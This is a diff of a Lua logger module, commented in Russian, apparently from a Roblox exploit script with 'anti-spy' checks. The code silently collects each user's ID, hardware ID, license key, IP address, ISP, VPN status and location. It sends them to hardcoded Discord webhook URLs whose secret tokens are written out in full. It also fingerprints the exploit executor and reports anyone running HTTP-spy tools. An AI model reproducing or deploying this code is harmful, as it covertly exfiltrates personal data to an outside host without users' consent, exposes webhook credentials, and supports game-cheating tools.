@@ -1,6 +1,5 @@
 -- =============================================================
--- ЛОГГЕР (ОТКРЫТАЯ ВЕРСИЯ, БЕЗ ШИФРОВКИ)
--- ЗАМЕНИ ВЕБХУКИ НА СВОИ ЕСЛИ НУЖНО
+-- ЛОГГЕР (ОТКРЫТАЯ ВЕРСИЯ, ИСПРАВЛЕНО ПАДЕНИЕ)
 -- =============================================================
 return function(SEC_STATE)
     if not SEC_STATE or not SEC_STATE.ORIG then return end
@@ -12,24 +11,39 @@ return function(SEC_STATE)
     local request = O.request
     local game_HttpGet = O.game_HttpGet
     local pcall = O.pcall
-    local pairs = O.pairs
-    local ipairs = O.ipairs
-    local tinsert = O.tinsert
-    local tconcat = O.tconcat
     local tostring = O.tostring
+    local type = O.type
     local m_floor = O.math_floor
     local task_wait = O.task_wait
     local task_spawn = O.task_spawn
+    local s_char = O.s_char
+    local s_sub = O.s_sub
 
-    -- --------------------------
-    -- ВЕБХУКИ (ОТКРЫТЫЙ ТЕКСТ)
-    -- --------------------------
-    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/15194099151558385938/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
-    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/15183340335888381827/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"
+    -- БЕЗОПАСНЫЕ ИТЕРАЦИИ (НИКОГДА НЕ ПАДАЮТ)
+    local function safe_ipairs(tbl, callback)
+        if type(tbl) ~= "table" then return end
+        pcall(function()
+            for i = 1, #tbl do
+                callback(tbl[i])
+            end
+        end)
+    end
+    local function safe_pairs(tbl, callback)
+        if type(tbl) ~= "table" then return end
+        pcall(function()
+            for k, v in pairs(tbl) do
+                callback(k, v)
+            end
+        end)
+    end
+    local function tinsert(arr, val)
+        if type(arr) ~= "table" then return end
+        table.insert(arr, val)
+    end
 
-    -- Если хочешь использовать свои вебхуки — вставляй их сюда вместо выше:
-    -- local WEBHOOK_LOG = "ТВОЙ_ВЕБХУК_ОБЫЧНЫХ_ЛОГОВ"
-    -- local WEBHOOK_ALERT = "ТВОЙ_ВЕБХУК_АЛЕРТОВ_О_СПАЯХ"
+    -- ВЕБХУКИ
+    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/1519409915155838593/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
+    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/1518334033588838182/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"
 
     local uid = tostring(LocalPlayer.UserId)
     local hwid = "N/A"
@@ -37,9 +51,7 @@ return function(SEC_STATE)
     local key = "N/A"
     pcall(function() key = O.readfile("nazarkus_key.json") end)
 
-    -- --------------------------
-    -- ВАЙТЛИСТ / БЛЭКЛИСТ
-    -- --------------------------
+    -- ВАЙТЛИСТ/БЛЭКЛИСТ
     local WHITELIST = {
         UIDs = {"10760143653"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
@@ -48,10 +60,13 @@ return function(SEC_STATE)
     local BLACKLIST = { UIDs = {}, HWIDs = {}, Keys = {} }
 
     local function inList(list)
-        for _, v in ipairs(list.UIDs or {}) do if v == uid then return true end end
-        for _, v in ipairs(list.HWIDs or {}) do if v == hwid then return true end end
-        for _, v in ipairs(list.Keys or {}) do if v == key then return true end end
-        return false
+        local found = false
+        safe_ipairs(list.UIDs, function(v) if v == uid then found = true end end)
+        if found then return true end
+        safe_ipairs(list.HWIDs, function(v) if v == hwid then found = true end end)
+        if found then return true end
+        safe_ipairs(list.Keys, function(v) if v == key then found = true end end)
+        return found
     end
     local userStatus = inList(WHITELIST) and "whitelist" or (inList(BLACKLIST) and "blacklist" or "guest")
     local spyDetected = SEC_STATE.detected or false
@@ -60,18 +75,14 @@ return function(SEC_STATE)
     SEC_STATE.hwid = hwid
     SEC_STATE.key = key
 
-    -- --------------------------
-    -- ИНФОРМАЦИЯ ОБ ЭКЗЕКЬЮТОРЕ
-    -- --------------------------
+    -- ЭКЗЕКЬЮТОР
     local executorName = "Unknown"
     local uncPercent = 0
     pcall(function()
         local supported = 0
         local genv = getgenv and getgenv() or _G
         local uncFuncs = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, funcName in ipairs(uncFuncs) do
-            if genv[funcName] then supported = supported + 1 end
-        end
+        safe_ipairs(uncFuncs, function(funcName) if genv[funcName] then supported = supported + 1 end end)
         uncPercent = m_floor((supported / #uncFuncs) * 100)
         if identifyexecutor then
             pcall(function() executorName = identifyexecutor() end)
@@ -79,9 +90,7 @@ return function(SEC_STATE)
     end)
     local executorString = executorName .. " (UNC: " .. uncPercent .. "%)"
 
-    -- --------------------------
-    -- СЕТЕВАЯ ИНФОРМАЦИЯ
-    -- --------------------------
+    -- СЕТЬ
     local net = {ip="N/A", isp="N/A", vpn="No", country="N/A", city="N/A"}
     pcall(function()
         local r = request({
@@ -90,7 +99,7 @@ return function(SEC_STATE)
         })
         if r and r.Success and r.Body then
             local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
-            if ok and data then
+            if ok and data and type(data) == "table" then
                 net.ip = data.query or "N/A"
                 net.isp = data.isp or "N/A"
                 net.vpn = data.proxy and "Yes" or "No"
@@ -100,16 +109,13 @@ return function(SEC_STATE)
         end
     end)
 
-    -- --------------------------
-    -- ФОРМИРУЕМ EMBED
-    -- --------------------------
     local embeds = {}
 
-    -- АЛЕРТ О СПАЕ (красный)
+    -- АЛЕРТ СПАЯ
     if spyDetected then
         tinsert(embeds, {
             title = "🚨 SECURITY ALERT: HTTP Spy Detected",
-            color = 16711680, -- красный
+            color = 16711680,
             fields = {
                 {name = "Detection Reason", value = "```" .. tostring(spyReason) .. "```", inline = false},
                 {name = "Player", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`", inline = false},
@@ -118,10 +124,8 @@ return function(SEC_STATE)
                 {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                 {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                 {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
-            },
-            footer = {text = "3F AntiSpy • DETECTED • " .. os.date("%d.%m.%Y %H:%M")}
+            }
         })
-        -- Отправляем на алерт вебхук
         pcall(function()
             request({
                 Url = WEBHOOK_ALERT,
@@ -133,21 +137,19 @@ return function(SEC_STATE)
         return
     end
 
-    -- ВАЙТЛИСТ (зелёный, короткий лог по твоему формату)
+    -- ВАЙТЛИСТ
     if userStatus == "whitelist" then
         tinsert(embeds, {
             title = "✅ Whitelisted User Executed",
-            color = 65280, -- зелёный
+            color = 65280,
             fields = {
                 {name = "**Player Info**", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nUser ID: `" .. uid .. "`", inline = false},
                 {name = "**Executor**", value = executorString, inline = false},
                 {name = "**System**", value = "Platform: " .. (UserInputService.TouchEnabled and "Mobile" or "PC"), inline = false},
                 {name = "**Hardware Info**", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false}
-            },
-            footer = {text = "3F AntiSpy • WHITELIST • " .. os.date("%d.%m.%Y %H:%M")}
+            }
         })
     else
-        -- БЛЭКЛИСТ (чёрный) ИЛИ ГОСТЬ (оранжевый)
         tinsert(embeds, {
             title = userStatus == "blacklist" and "⛔ Blacklisted User Attempt" or "⚠️ Guest User Executed",
             color = userStatus == "blacklist" and 0 or 16753920,
@@ -158,12 +160,10 @@ return function(SEC_STATE)
                 {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                 {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                 {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
-            },
-            footer = {text = "3F AntiSpy • " .. string.upper(userStatus) .. " • " .. os.date("%d.%m.%Y %H:%M")}
+            }
         })
     end
 
-    -- Отправляем обычный лог
     pcall(function()
         request({
             Url = WEBHOOK_LOG,
